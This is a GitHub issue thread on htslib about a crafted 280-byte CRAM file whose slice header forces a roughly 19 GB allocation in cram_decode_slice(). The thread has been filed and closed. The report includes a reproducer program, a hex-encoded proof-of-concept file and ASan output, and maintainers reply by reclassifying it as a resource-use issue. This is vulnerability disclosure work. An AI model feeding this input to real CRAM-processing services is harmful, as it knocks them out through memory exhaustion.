# [Bug]Uncontrolled allocation in cram_decode_slice(): a file-controlled CRAM slice record count drives hts_malloc_p() to request ~19 GB (ASan out-of-memory, CWE-789)

- URL: https://github.com/samtools/htslib/issues/2090
- Repo: samtools/htslib (language: C)
- State: closed; created 2026-09-15T13:23:09Z; status ok; passes main

## Issue body

reporter (NONE) · 1820893135-pixel · 2026-09-15T13:23:09Z · https://github.com/samtools/htslib/issues/2090

## Hi,

While fuzzing htslib against untrusted CRAM input, I found a bug: a small crafted CRAM file makes `cram_decode_slice()` allocate a record array sized directly from a file-controlled count field, requesting about 19 GB from a ~280-byte input. AddressSanitizer aborts the process (`allocator is out of memory`); a normal build degrades to an unbounded allocation / OOM.

## Summary

When decoding a CRAM slice, `cram_decode_slice()` allocates the per-record array from the slice header's record count with no upper bound:

```c
/* cram/cram_decode.c:2418-2419 */
if (!(s->crecs = hts_malloc_p(sizeof(*s->crecs), s->hdr->num_records)))
    return -1;
```

`num_records` comes straight from the (untrusted) slice header. `hts_malloc_p(size, n)` computes `size * n` and forwards to `hts_malloc`, which for large values requests the full product from `malloc`. A header claiming a large `num_records` therefore turns a tiny CRAM file into a multi-gigabyte allocation; ASan reports:

```
ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x4bffffed0 bytes   (~19 GB)
    #3 cram_decode_slice   cram/cram_decode.c:2419:22
    #4 cram_next_slice     cram/cram_decode.c:3498:13
    #5 cram_get_seq        cram/cram_decode.c:3603:23
    #6 cram_get_bam_seq    cram/cram_decode.c:3665:16
    #7 sam_read1_cram      sam.c:4131:15
    #8 sam_read1           sam.c:4260:19
```

- **Affected versions**: htslib 1.24 (`HTS_VERSION 102400`)
- **Severity**: Medium (a few hundred bytes of untrusted CRAM forces a multi-GB allocation → OOM DoS; reachable through the public read API)
- **CWE**: CWE-789 (Memory Allocation with Excessive Size Value), CWE-770

## Detail

### Affected code

`cram/cram_decode.c`:

```c
if (s->crecs)
    free(s->crecs);
if (!(s->crecs = hts_malloc_p(sizeof(*s->crecs), s->hdr->num_records)))
    return -1;
```

and `htslib/hts_alloc.h`, where the product is formed and handed to `malloc`:

```c
/* hts_alloc.h:98 / :122 -- the product is not bounded */
static inline void *hts_malloc(size_t nbytes) { ... malloc(nbytes) ... }
static inline void *hts_malloc_p(size_t size, size_t n) { return hts_malloc(size * n); }
```

**Root cause**: the allocation size is `sizeof(crec) * num_records`, and `num_records` is taken verbatim from the slice header with no cap and no check against the remaining input size. A crafted header sets it large; ASan's allocator aborts on the resulting ~19 GB request, and a plain `malloc` build either OOMs or (with overcommit) returns a pointer that later writes fault. The correct behaviour is to reject a slice whose declared record count cannot possibly fit in the bytes remaining.

### Trigger path

```
sam_read1 (sam.c:4260)
  -> sam_read1_cram (sam.c:4131)
     -> cram_get_bam_seq (cram/cram_decode.c:3665)
        -> cram_get_seq (cram/cram_decode.c:3603)
           -> cram_next_slice (cram/cram_decode.c:3498)
              -> cram_decode_slice (cram/cram_decode.c:2419)   <-- uncontrolled allocation
```

## Build the reproducer

```bash
git clone --depth 1 --branch 1.24 https://github.com/samtools/htslib.git
cd htslib
./configure --disable-bz2 --disable-lzma --disable-libcurl --disable-gcs --disable-s3 --disable-plugins \
            --without-libdeflate --without-external-htscodecs
make -j"$(nproc)" libhts.a \
     CC=clang CFLAGS="-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined -fno-sanitize-recover=all"
```

Save this driver as `repro.c` (public API only — `hts_open` + `sam_hdr_read` + `sam_read1`):

```c
#include <stdio.h>
#include <htslib/hts.h>
#include <htslib/sam.h>
int main(int argc, char **argv) {
    htsFile *fp = hts_open(argv[1], "r");
    if (!fp) { fprintf(stderr, "hts_open failed\n"); return 2; }
    sam_hdr_t *h = sam_hdr_read(fp);
    if (!h) { fprintf(stderr, "hdr failed\n"); return 3; }
    bam1_t *b = bam_init1();
    while (sam_read1(fp, h, b) >= 0) { }   /* -> cram_decode_slice huge malloc */
    bam_destroy1(b); sam_hdr_destroy(h); hts_close(fp);
    return 0;
}
```

```bash
clang -g -O1 -fsanitize=address,undefined -fno-sanitize-recover=all -I. \
      repro.c libhts.a -lz -lm -lpthread -o repro
```

## POC (tested on the unmodified source)

A 280-byte CRAM file whose slice header declares an oversized record count. Rebuild it from hex:

```bash
printf '%s' '4352414d030056756c6e50696c6f744352414d7465737400000093000000f0ffffffff000000000001008bbd47b6000000808880888400000040484409564e3a312e3609534f3a636f6f7264696e6174650a40535109534e3a63687231094c4e3a313030300a40535109534e3a63687232094c4e3a323030300a4052470949443a72673109534d3a73616d706c653109504c3a494c4c554d494e410a4050470949443a70673109504e3a6874736c69622d7465737409564e3a312e300afb9b6a083e000000f0ffffffff0000f07ffffffe010003010f2540aa910001000606010001000100ee63014b0003001919f07ffffffe00010100000000000000000000000000000000007e55c3070005000404000000001cfef8c0' | xxd -r -p > poc.cram
sha256sum poc.cram
# must print: 1ccb5bcdaf079e9f9ccf6bc3d3e084c763065d8ec8f7dd08dbbc60f613a6eb89
ls -l poc.cram     # 280 bytes
```

Run:

```bash
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 ./repro poc.cram
```

## Trigger result

Verified on an unmodified htslib 1.24 build as above:

```
=================================================================
==3455942==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x4bffffed0 bytes
    #0 __interceptor_malloc
    #1 hts_malloc       hts_alloc.h:98:12
    #2 hts_malloc_p     hts_alloc.h:122:12
    #3 cram_decode_slice cram/cram_decode.c:2419:22
    #4 cram_next_slice  cram/cram_decode.c:3498:13
    #5 cram_get_seq     cram/cram_decode.c:3603:23
    #6 cram_get_bam_seq cram/cram_decode.c:3665:16
    #7 sam_read1_cram   sam.c:4131:15
    #8 sam_read1        sam.c:4260:19
SUMMARY: AddressSanitizer: allocator is out of memory
```

- Exit code: `134` (SIGABRT); deterministic on re-run.
- The requested size (`0x4bffffed0` ≈ 19 GB) comes from a 280-byte file — a ~70,000x amplification.

## Impact

Any consumer of untrusted CRAM (alignment pipelines, `samtools view`, services that accept uploaded CRAM) can be driven to a multi-gigabyte allocation from a sub-KB file, exhausting memory and aborting the process (DoS). With memory overcommit the allocation can also "succeed" and be touched later, turning the same input into a crash on write. No code execution or information leak is demonstrated.

<img width="2255" height="701" alt="Image" src="https://github.com/user-attachments/assets/78b4dd3b-27f4-4e10-9c63-7c0d62521c5d" />

## Suggested fix

Cap the slice record count against a sane bound and against the number of bytes actually remaining in the slice/container before allocating:

```c
/* reject a header whose record count cannot fit the remaining input */
if (s->hdr->num_records > MAX_CRAM_SLICE_RECORDS ||
    (size_t)s->hdr->num_records > remaining_bytes / sizeof(*s->crecs))
    return -1;   /* malformed slice header */
if (!(s->crecs = hts_malloc_p(sizeof(*s->crecs), s->hdr->num_records)))
    return -1;
```

Alternatively, make `hts_malloc_p` reject products that overflow `SIZE_MAX` and exceed a configurable ceiling so one malformed field can never drive an unbounded allocation. Adding this input to the regression corpus would prevent a re-introduction.

## Comment 5681261421

maintainer (MEMBER) · daviesrob · 2026-09-15T13:47:21Z · https://github.com/samtools/htslib/issues/2090#issuecomment-5681261421

Are you a real person or an LLM?

Anyway, anyone processing genomic data needs to be aware that it could involve making multi-Gbyte memory allocations and take appropriate precautions.  This can happen even with valid data so it is not easy to prevent in general.

## Comment 5681421442

reporter (NONE) · 1820893135-pixel · 2026-09-15T13:58:06Z · https://github.com/samtools/htslib/issues/2090#issuecomment-5681421442

Hi — yep, real person here.

Fair point about valid data legitimately needing big allocations. But I think this one's worth a closer look, because it's not really "big data → big allocation" — it's a 280-byte file whose slice header just claims a huge record count that has nothing to do with how many bytes are actually there.

In the same function that reads `num_records` (`cram_io.c:3587`), the next count it reads is `num_landmarks`, and that one *is* bounded:

```c
/* cram_io.c:3621 */
if (c2.num_landmarks < 0 || c2.num_landmarks >= SIZE_MAX / sizeof(int32_t))
    return NULL;
```

`num_records` gets nothing like that before it hits `hts_malloc_p(sizeof(*s->crecs), s->hdr->num_records)` in `cram_decode.c:2419`.

I'm not suggesting a global allocation cap — just a local sanity check: reject a slice whose `num_records` can't fit the remaining bytes, or at minimum bound it the way `num_landmarks` is so the multiply can't blow up. Normal big files keep working; the tiny-file-with-huge-count case stops. This is the usual CWE-789 / CWE-770 shape — an allocation size taken from untrusted input without a limit — and here the limit already exists one field over, so it looks like an easy local fix.

Would be great if you could take a closer look. Happy to send the PoC or a patch if it's useful.


## Comment 5681640216

other (CONTRIBUTOR) · jkbonfield · 2026-09-15T14:11:35Z · https://github.com/samtools/htslib/issues/2090#issuecomment-5681640216

It's a fair comment that maybe we can limit the amount it can allocate based on the size of the container.  Specifying a maximum expansion rate basically as anything outside that is unrealistically good compression.  However it's hard to do this in a provable way.

As for configuring a memory limit, there's no need for us to reinvent the wheel.  The user can just use the `ulimit` command to set per-process memory limits, which may be a good thing to do if you're worried about unchecked data causing high memory usage (even if the high memory usage turns out to be genuine due to the nature of the data-set).


## Comment 5681904295

reporter (NONE) · 1820893135-pixel · 2026-09-15T14:25:00Z · https://github.com/samtools/htslib/issues/2090#issuecomment-5681904295

Thanks, that makes sense — and agreed, ulimit is the right place for a memory ceiling.

The only bit I'd still flag is that this particular count is unchecked while its neighbour (`num_landmarks`) isn't, so the container-size bound you mentioned would be a pretty local change. But that's your call — happy to send the PoC or a patch if it's ever useful.


## Comment 5682263006

other (CONTRIBUTOR) · jkbonfield · 2026-09-15T14:44:14Z · https://github.com/samtools/htslib/issues/2090#issuecomment-5682263006

The `num_landmarks` limit was put there in 2016 in https://github.com/samtools/htslib/pull/441.  It was found by AFL and fixed.  The problem there was a wraparound in the multiplication causing undersized allocations and then potentially buffer-write overruns due to too small an allocation.

Since then the mallocs have been replaced with `hts_malloc_p` ("p" for "product") which has inbuilt overflow detection and will fail allocation rather than wrapping around and potentially giving undersized memory.   See https://github.com/samtools/htslib/pull/2006.

So the original bug from 2016 wouldn't have triggered any more, and nor would this one.  It can use lots of memory, but it cannot trivially become a buffer overflow (assuming we've caught all the allocations correctly).  This downrates this to a "play nice" thing rather than a security issue.  It may not be too hard to put an arbitrary limit, but it'll need thought to get right, especially as the function doesn't have immediate access to the things it needs to know such as the size of the slice in bytes.  It don't think it'll know it's only 280 bytes long without a lot of introspection in the container landmarks.  Maybe we could put that into a dedicate function, or cache it during container decode.  Either way, it's not a trivial one liner to do this right.

I suspect however that anything over 10 million is excessive.  `cram_record` is 152 bytes for me, so 19GB comes out at ~130 million sequences.  Maybe an arbitrary limit is viable, although I suspect there are many cases of big allocations through junk inputs.  Specifying a global memory limit via ulimit is a far saner catch-all.

## Comment 5683172722

reporter (NONE) · 1820893135-pixel · 2026-09-15T15:36:32Z · https://github.com/samtools/htslib/issues/2090#issuecomment-5683172722

Thanks — that clears it up, and I hadn't gone digging back to #441 or #2006. If `hts_malloc_p` already saturates the product and `hts_malloc` rejects anything over `PTRDIFF_MAX`, then the undersized-allocation → overflow path is genuinely closed and this is a resource-use / "play nice" issue rather than a memory-safety one. I'll take that.

Agreed that `ulimit` is the saner catch-all. If it's ever worth a bound, the ">10 million records is excessive" angle sounds reasonable — but I see the point that getting it right needs the slice byte size, which isn't readily available there.

Thanks for the detailed background.


## Comment 5697870558

maintainer (MEMBER) · daviesrob · 2026-09-16T13:02:00Z · https://github.com/samtools/htslib/issues/2090#issuecomment-5697870558

Closing as the code is working as intended.
